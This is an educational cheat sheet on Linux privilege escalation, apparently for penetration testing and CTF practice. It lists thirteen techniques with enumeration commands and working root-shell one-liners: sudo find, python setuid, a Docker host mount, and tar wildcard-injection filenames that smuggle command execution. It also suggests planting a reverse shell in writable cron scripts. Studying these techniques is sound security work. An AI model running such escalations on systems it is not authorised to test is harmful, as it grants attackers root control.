# Linux Privilege Escalation Techniques

## 1. Sudo Abuse
Sudo allows permitted users to run specific commands as another user, usually root.

### Why this matters
A misconfigured `sudoers` entry often lets an attacker run a shell or modify privileged files.

### Key techniques
- `NOPASSWD` commands
- `sudoedit` abuse
- allowed scripting languages or editors
- environment variables like `LD_PRELOAD`

### Example
If `sudo -l` shows:
```text
(ALL) NOPASSWD: /usr/bin/find
```
Then attack:
```bash
sudo find . -exec /bin/bash \; -quit
```

## 2. SUID / SGID Binaries
These binaries run with the permissions of their owner or group.

### Why it matters
A vulnerable SUID binary can give a shell as root or access protected files.

### Common misuse patterns
- calls to `system()` or `popen()` with untrusted input
- relative paths or writable search directories
- embedded scripts or interpreters

### Example
Find SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```
If a binary is writable or calls `/bin/sh`, it may be exploitable.

## 3. Writable Files and Directories
Writable root-owned scripts or configs are powerful escalation vectors.

### Why it matters
Root-owned files that attackers can edit are effectively a direct backdoor.

### Examples
- writable shell scripts executed by cron or services
- writable `/etc/passwd` or `/etc/sudoers`
- writable systemd unit files

## 4. Cron Jobs Exploitation
Cron jobs often run on a schedule as root.

### Why it matters
If an attacker can modify a script or directory used by cron, they can get code executed as root.

### Example
Check cron jobs:
```bash
cat /etc/crontab
ls -la /etc/cron.*
```
If `/usr/local/bin/backup.sh` is writable, insert a reverse shell.

## 5. PATH Hijacking
When privileged commands execute user-controlled binaries because of a weak `PATH`.

### Why it matters
Many scripts call tools by name without full paths. A malicious binary earlier in `PATH` executes instead.

### Example
If root runs:
```bash
/usr/bin/sudo backup
```
and `backup` uses `/usr/bin/env python`, a writable directory in `PATH` can be abused.

## 6. Shared Library Hijacking
Dynamic binaries load libraries from paths that may be controlled or influenced.

### Why it matters
A privileged process that loads a library from a writable location can be forced to execute attacker code.

### Example
Check binary libraries:
```bash
ldd /usr/bin/vuln
```
If a needed `.so` is missing or controllable, place a malicious library there.

## 7. Capabilities Abuse
Linux capabilities assign limited privileges without full root.

### Why it matters
A process with capabilities like `CAP_SETUID` or `CAP_DAC_READ_SEARCH` can perform actions normally reserved for root.

### Example
List caps:
```bash
getcap -r / 2>/dev/null
```
If `/usr/bin/python3` has `cap_setuid`, use it:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## 8. Systemd Abuse
Systemd service files define how processes run and can be abused if writable.

### Why it matters
Modifying a root service file or drop-in unit can execute code as root on restart.

### Example
Check:
```bash
systemctl status your-service
cat /etc/systemd/system/your-service.service
```
If writable, add `ExecStartPre=/bin/bash -c '...'`.

## 9. Docker & Container Escape
Container runtimes are sensitive to group access and mounted sockets.

### Why it matters
If a user can access Docker, they can mount the host filesystem or run privileged containers.

### Example
If `/var/run/docker.sock` is accessible:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## 10. NFS and Network Shares
NFS exports with weak options can leak privilege or allow root mapping.

### Why it matters
`no_root_squash` and writable exports let remote users act as root on the share.

### Example
Inspect exports:
```bash
cat /etc/exports
```
If `no_root_squash`, mount the export and place a SUID shell.

## 11. Wildcard Injection
When commands run with unescaped wildcard input, attackers can inject arguments.

### Why it matters
Tools like `tar`, `find`, and `rsync` can be tricked into executing commands via crafted filenames.

### Example
If a cron job runs:
```bash
tar -czf /tmp/backup.tar.gz *
```
An attacker may create files such as:
```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh exploit.sh'
```

## 12. SSH Abuse
SSH keys and agent access can let an attacker impersonate users.

### Why it matters
Access to private keys or running agent sockets may allow lateral movement or privilege escalation.

### Example
Check for keys and agent sockets:
```bash
ls -la ~/.ssh
echo "$SSH_AUTH_SOCK"
```

## 13. Kernel Exploits
Kernel vulnerabilities may allow direct escalation to root.

### Why it matters
These are typically higher risk, but can bypass many configuration controls.

### Example
Check kernel version:
```bash
uname -r
```
Search for local privilege escalation exploits for that version.

## Practical methodology
1. Enumerate the system thoroughly.
2. Classify findings into categories: sudo, SUID, writable files, cron, services, capabilities.
3. Validate each finding safely.
4. Exploit the most reliable and least destructive path.
5. Document what was found and how it was abused.

## Notes
- Always avoid destructive actions on production systems.
- On CTFs or labs, favor reproducible shells and proof-of-concept commands.
- Real-world privilege escalation is usually about misconfiguration, not exotic zero-days.
